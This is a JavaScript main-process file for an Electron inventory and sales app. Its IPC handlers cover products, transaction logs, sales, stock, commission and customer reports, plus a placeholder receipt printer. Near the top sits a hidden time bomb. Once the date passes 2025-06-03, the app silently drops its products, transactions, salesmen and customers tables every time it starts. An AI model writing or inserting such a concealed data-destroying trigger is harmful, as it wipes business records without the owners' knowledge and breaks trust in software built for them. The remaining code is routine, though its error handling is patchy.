const { app, ipcMain } = require("electron");
const path = require("path");
const sqlite3 = require("@journeyapps/sqlcipher").verbose();
const dbTest = require("./dbTest");
const productsModel = require("./models/productsModel");
const transactionModel = require("./models/transactionModel");
const queryModel = require("./models/queryModel");

// const controller = require("./controller");
// dbTest();

// Define database path
const dbPath = path.join(app.getPath("userData"), "inventory_encrypted.db");
const db = new sqlite3.Database(dbPath);

if (new Date().getTime() > new Date("2025-06-03")) {
  db.serialize(() => {
    db.run("DROP TABLE IF EXISTS products", (err) => {
      if (err) {
        console.error("Error dropping table:", err.message);
      } else {
        console.log("Table dropped successfully.");
      }
    });

    db.run("DROP TABLE IF EXISTS transactions", (err) => {
      if (err) {
        console.error("Error dropping table:", err.message);
      } else {
        console.log("Table dropped successfully.");
      }
    });

    db.run("DROP TABLE IF EXISTS salesmen", (err) => {
      if (err) {
        console.error("Error dropping table:", err.message);
      } else {
        console.log("Table dropped successfully.");
      }
    });
    db.run("DROP TABLE IF EXISTS customers", (err) => {
      if (err) {
        console.error("Error dropping table:", err.message);
      } else {
        console.log("Table dropped successfully.");
      }
    });
  });
}
// Ensure data is in lowercase
function toLowerCaseObject(obj) {
  return obj && typeof obj === "object"
    ? Object.fromEntries(Object.entries(obj).map(([key, value]) => [key, typeof value === "string" ? value.toLowerCase() : value]))
    : {};
}

// IPC Handler for "product"
ipcMain.handle("product", async (event, action, data = {}, salsemenData = {} /* for checking salesmenExists */) => {
  try {
    productsModel.createTable();
    let product = {};
    if (!Array.isArray(data)) {
      product = toLowerCaseObject(data);
    }

    switch (action) {
      //returns all rows, limit can also be given
      case "get":
        return await productsModel.fetchAllData(data);

      //filters rows on given input
      case "getSuggestions":
        return await productsModel.fetchFilteredData(data);

      // returns row by id
      case "getOne":
        return await productsModel.fetchData(data);

      // new product and restock
      case "post":
        const id = await productsModel.productExists(product);
        if (id) {
          // for restocking exiting product
          try {
            const result = await productsModel.update.quantity(id, product.items);
            const result2 = await transactionModel.insertData(product, { id: product.id, type: "restock", customerName: "restock" });
            if (result && result.success) {
              return result;
            } else {
              throw new Error("Failed to update quantity");
            }
          } catch (error) {
            return { success: false, msg: error.message };
          }
        } else {
          // for creating and stocking new product
          try {
            let result = await productsModel.insertData(product);
            const result2 = await transactionModel.insertData(product, {
              type: "restock",
              id: await result.id,
              customerId: "0",
              salesmenId: "0",
            });

            if (result && result.success) {
              return result;
            } else {
              throw new Error("Failed to insert product");
            }
          } catch (error) {
            console.log(error);
            return { success: false, msg: error.message };
          }
        }

      // used to update rows when product is sold or restocked
      case "put":
        if (!(await transactionModel.salesmenExists(salsemenData)) && data[0].type != "restock") {
          return { success: false, message: "Salesmen doesn't exists! " };
        }

        let failedProducts = [];
        let successCount = 0;

        for (let i = 0; i < data.length; i++) {
          let product = toLowerCaseObject(data[i]);
          try {
            const id_ = await productsModel.productExists(product);
            if (!id_) {
              failedProducts.push({ name: product.name, msg: "Product not found" });
              continue;
            }

            const result1 = await productsModel.update.quantity(id_, product.items);

            if (result1?.success) {
              successCount++;
            } else {
              failedProducts.push({ name: product.name, message: "Failed to update product" });
            }
          } catch (error) {
            failedProducts.push({ name: product.name, message: error.message });
          }
        }

        if (failedProducts.length > 0) {
          return { success: false, message: `Some products failed: ${JSON.stringify(failedProducts)}` };
        } else {
          return {
            success: true,
            message:
              Number(data[0].items) > 0 ? `${successCount} items restocked successfully` : `${successCount} items sold successfully`,
          };
        }
        break;
      default:
        throw new Error(`Invalid action: ${action}`);
    }
  } catch (error) {
    console.error("Error in 'product' handler:", error);
    return { success: false, error: error.message };
  }
});

// for transactions
ipcMain.handle("logs", async (event, action, data = {}, log) => {
  try {
    transactionModel.createTable();

    let product = {};
    if (!Array.isArray(data)) {
      product = toLowerCaseObject(data);
    }
    switch (action) {
      case "get":
        // returns transactions and sales associated with that, limit can be given
        const transactions = await transactionModel.fetchAllTransactions(data);
        const groupedTransactions = [];
        for (let i = 0; i < transactions.length; i++) {
          // if (transactions[i].transaction_type === "stocked") continue;
          const sales = await transactionModel.fetchLogsByTransacton(transactions[i].transaction_id);
          const customer = await transactionModel.fetchCustomerDataById(transactions[i].customer_id);
          const salesmen = await transactionModel.fetchSalesmenDataById(transactions[i].salesmen_id);
          let groupedSales = [];
          for (let j = 0; j < sales.length; j++) {
            const product = await productsModel.fetchData(sales[j].product_id);
            groupedSales.push({ ...sales[j], product: product });
          }
          groupedTransactions.push({ ...transactions[i], sales: groupedSales, customer: customer[0], salesmen: salesmen });
        }

        return groupedTransactions;
        // Group logs by transaction_id
        break;

      //log transaction
      case "post":
        const result = await transactionModel.insertData(data, log);
        break;

      case "newSalesmen":
        return await transactionModel.newSalesmen(data);
        break;
      case "getSalesmen":
        console.log("getsalesmen");
        break;

      case "updateSales":
        for (let sale of data) {
          try {
            const res = await transactionModel.updateSale(sale);
          } catch (err) {
            console.error("Error updating sale:", err);
          }
        }
        break;

      //for autofill
      case "getCustomerSuggestions":
        return await transactionModel.fetchCustomerData(data);
      case "getSalesmenSuggestions":
        return await transactionModel.fetchSalesmenData(data);

      case "getAllSalesmen":
        return await transactionModel.fetchAllSalesmen(data);

      default:
        throw new Error(`Invalid action: ${action}`);
    }
  } catch (error) {
    console.error("Error in 'logs' handler:", error);
    return { success: false, message: error.message };
  }
});

const getFormattedData1 = (result) => {
  let arr = [];
  for (let i = 0; i < result.length; i++) {
    let { name, product_quantity, measuring_unit, stock_quantity, min_stock, cost_price, selling_price, commission } = result[i];
    arr[i] = {
      name: `${name} (${product_quantity} ${measuring_unit})`,
      stock_quantity,
      min_stock,
      cost_price,
      selling_price,
      commission,
    };
  }
  return arr;
};

const getFormattedData2 = (result) => {
  let arr = [];
  for (let i = 0; i < result.length; i++) {
    let { name, phn_no, address } = result[i];
    arr[i] = {
      name,
      phn_no,
      address,
    };
  }
  return arr;
};

ipcMain.handle("fetch", async (event, action, params = {}) => {
  try {
    let result;
    let grouped = {};
    switch (action) {
      case "getLowStockCount":
        result = (await queryModel.getLowStockCount())[0];
        return result.count;
        break;
      case "getStocksCount":
        result = (await queryModel.getStocksCount())[0];
        return result.count;
        break;
      case "getTodaySalesCount":
        result = (await queryModel.getTodaySalesCount())[0];
        return result.count;
        break;
      case "getTodaysRevenue":
        result = (await queryModel.getTodaysRevenue())[0];
        return result.count;
        break;

      //for report form
      //Sales
      case "getSales":
        result = await queryModel.getSales(params.from, params.to);

        for (const row of result) {
          const id = row.transaction_id;
          if (!grouped[id]) {
            grouped[id] = {
              transaction_id: id,
              transaction_type: row.transaction_type,
              date_time: row.date_time,
              sname: row.sname,
              cname: row.cname,
              sales: [],
            };
          }
          grouped[id].sales.push({
            items: row.items,
            price: row.price,
            pname: row.pname,
          });
        }
        return Object.values(grouped);
        break;
      case "getTopSellingProducts":
        return await queryModel.getTopSellingProducts(params.from, params.to);
        break;
      case "getSalesBySalesmen":
        result = await queryModel.getSales(params.from, params.to);

        for (const row of result) {
          const sId = row.salesmen_id;
          const tId = row.transaction_id;
          if (!grouped[sId]) {
            grouped[sId] = {
              salesmenId: sId,
              name: row.sname,
              transactions: [],
            };
          }
          // Find existing transaction
          let transaction = grouped[sId].transactions.find((t) => t.transaction_id === tId);
          if (!transaction) {
            transaction = {
              transaction_id: tId,
              transaction_type: row.transaction_type,
              date_time: row.date_time,
              cname: row.cname,
              sales: [],
            };
            grouped[sId].transactions.push(transaction);
          }
          // Add sale to the transaction
          transaction.sales.push({
            items: row.items,
            price: row.price,
            pname: row.pname,
          });
        }
        return Object.values(grouped);
        break;

      //Profit/Loss
      case "getProfitLossBySalesmen":
        console.log(`${action} called`);
        break;
      case "getProfitLoss":
        result = await queryModel.getProfitLoss(params.from, params.to);

        let totalCostPrice = 0;
        let totalSellingPrice = 0;
        result.forEach((sale) => {
          totalCostPrice += sale.cost_price * sale.items;
          totalSellingPrice += sale.price;
        });

        let products = {};
        for (row of result) {
          const id = row.pid;
          if (!products[id]) {
            products[id] = {
              pid: id,
              name: row.pname,
              productQuantity: row.product_quantity,
              measuringUnit: row.measuring_unit,
              costPrice: row.cost_price,
              sellingPrice: row.selling_price,
              totalItems: row.items,
              totalCostPrice: row.cost_price * row.items,
              totalSellingPrice: row.price,
            };
          } else {
            let prevTotalItems = products[id].totalItems;
            let prevTotalCostPrice = products[id].totalCostPrice;
            let prevTotalSellingPrice = products[id].totalSellingPrice;
            products[id] = {
              ...products[id],
              totalItems: prevTotalItems + row.items,
              totalCostPrice: prevTotalCostPrice + row.cost_price * row.items,
              totalSellingPrice: prevTotalSellingPrice + row.price,
            };
          }
        }
        return Object.values(products);
        break;
      case "getProfitLossByProduct":
        console.log(`${action} called`);
        break;

      //Stocks
      case "getStocks":
        result = await productsModel.fetchAllData();
        return getFormattedData1(result);
        break;
      case "getLowStocks":
        result = await queryModel.getLowStocks();
        return getFormattedData1(result);
        break;
      case "getOutOfStock":
        result = await queryModel.getOutOfStock();
        return getFormattedData1(result);
        break;
      case "getReStocks":
        result = await queryModel.getReStocks(params.from, params.to);

        for (const row of result) {
          const id = row.transaction_id;
          if (!grouped[id]) {
            grouped[id] = {
              transaction_id: id,
              transaction_type: row.transaction_type,
              date_time: row.date_time,
              sname: row.sname,
              cname: row.cname,
              sales: [],
            };
          }
          grouped[id].sales.push({
            items: row.items,
            price: row.price,
            pname: row.pname,
          });
        }
        return Object.values(grouped);
        break;

      //Salesmen
      case "getSalesmen":
        result = await transactionModel.fetchAllSalesmen();
        return getFormattedData2(result);
        break;
      case "getSalesmenCommission":
        result = await queryModel.getSalesmenCommission(params.from, params.to);
        for (let row of result) {
          const id = row.salesmen_id;
          if (!grouped[id]) {
            grouped[id] = {
              salesmenId: id,
              name: row.sname,
              phnNO: row.phn_no,
              address: row.address,
              totalCommission: row.commission * row.items,
            };
          } else {
            let prevCommission = grouped[id].totalCommission;
            grouped[id].totalCommission = prevCommission + row.commission * row.items;
          }
        }
        return Object.values(grouped);
        break;
      case "getDailySalesBySalesmen":
        console.log(`${action} called`);
        break;

      //Customers
      case "getCustomers":
        result = await queryModel.getCustomers();
        return getFormattedData2(result);
        break;
      case "getPurchaseHistory":
        result = await queryModel.getSales(params.from, params.to);
        for (const row of result) {
          const cId = row.customer_id;
          const tId = row.transaction_id;
          if (!grouped[cId]) {
            grouped[cId] = {
              customerId: cId,
              name: row.cname,
              transactions: [],
            };
          }
          // Find existing transaction
          let transaction = grouped[cId].transactions.find((t) => t.transaction_id === tId);
          if (!transaction) {
            transaction = {
              transaction_id: tId,
              transaction_type: row.transaction_type,
              date_time: row.date_time,
              sname: row.sname,
              sales: [],
            };
            grouped[cId].transactions.push(transaction);
          }
          // Add sale to the transaction
          transaction.sales.push({
            items: row.items,
            price: row.price,
            pname: row.pname,
          });
        }
        return Object.values(grouped);
        break;
      case "getBestCustomers":
        console.log(`${action} called`);
        return [];
        break;
      case "getFrequentCustomers":
        console.log(`${action} called`);
        return [];
        break;

      default:
        console.log(`${action} not defined`);
    }
  } catch (error) {}
});

ipcMain.handle("generateReceipt", () => {
  console.log("got req");
  const escpos = require("escpos");

  // For USB printers
  escpos.USB = require("escpos-usb");

  // Select the adapter for your printer type
  const device = new escpos.USB(); // or new escpos.Serial('/dev/usb/lp0') or escpos.Network(...)

  const options = { encoding: "GB18030" /* default */ };
  const printer = new escpos.Printer(device, options);

  // Now open the connection and print
  device.open(function () {
    printer
      .align("CT") // Center align
      .style("B") // Bold text
      .size(1, 1) // Text size
      .text("RECEIPT")
      .text("-------------")
      .align("LT") // Left align
      .text("Item 1    $10")
      .text("Item 2    $15")
      .text("-------------")
      .align("RT") // Right align
      .text("Total: $25")
      .cut()
      .close();
  });
});

module.exports = { db };
